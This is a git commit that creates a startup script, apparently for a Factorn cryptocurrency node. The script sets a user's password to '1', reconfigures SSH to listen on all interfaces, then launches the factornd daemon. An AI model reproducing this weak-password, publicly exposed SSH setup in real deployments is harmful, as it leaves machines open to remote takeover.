60ae50f189c70be71a622e17d0df0d82db31fe54
XrayHunter <51248011+XrayHunter@users.noreply.github.com>
2024-03-24 17:40:31 +0100

    Create nodestart.sh

---
+++ nodestart.sh
@@ -0,0 +1,8 @@
+#!/usr/bin/bash
+
+# Change user password
+echo 'user:1' | sudo chpasswd                                                                                                                                                                                      
+
+# Modify SSH configuration
+sudo sed -i 's/^#*ListenAddress 127.0.0.1/ListenAddress 0.0.0.0/' /etc/ssh/sshd_config && sudo service ssh restart                                                                                                 
+/factorn-f597273f3bdc/bin/factornd -daemon -server
